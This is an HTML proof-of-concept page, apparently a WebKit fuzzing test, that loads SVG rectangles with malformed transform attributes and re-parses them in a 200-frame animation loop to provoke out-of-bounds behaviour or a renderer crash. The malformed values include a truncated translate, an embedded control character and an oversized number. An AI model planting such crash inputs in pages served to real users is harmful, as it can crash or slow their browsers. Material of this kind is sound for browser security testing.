<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>WebKit OOB Test com SVG</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
    svg {
      border: 2px solid lime;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>WebKit PoC com SVG + translate()</h1>
  <p>Verifique comportamento anômalo, lentidão ou falha ao renderizar.</p>

  <svg width="200" height="200">
    <!-- Transformação truncada -->
    <rect id="r1" x="10" y="10" width="50" height="50" fill="red" transform="translate(123" />

    <!-- Transformação com caractere especial -->
    <rect id="r2" x="70" y="10" width="50" height="50" fill="blue" transform="tran&#x0001;ate(1)" />

    <!-- Transformação com excesso de caracteres -->
    <rect id="r3" x="130" y="10" width="50" height="50" fill="green"
          transform="translate(999999999999999999999999999999999999999999999999999999)" />

    <!-- Transformação válida (controle) -->
    <rect id="r4" x="10" y="70" width="50" height="50" fill="yellow" transform="translate(0)" />
  </svg>

  <script>
    // Força o reprocessamento e layout do SVG
    const ids = ["r1", "r2", "r3", "r4"];
    let count = 0;

    function stressSVG() {
      for (const id of ids) {
        const el = document.getElementById(id);
        el.setAttribute("transform", el.getAttribute("transform"));
        const bbox = el.getBBox(); // força parsing e render do transform
        console.log(`${id} bbox:`, bbox.x, bbox.y);
      }

      count++;
      if (count < 200) requestAnimationFrame(stressSVG);
    }

    stressSVG();
  </script>
</body>
</html>
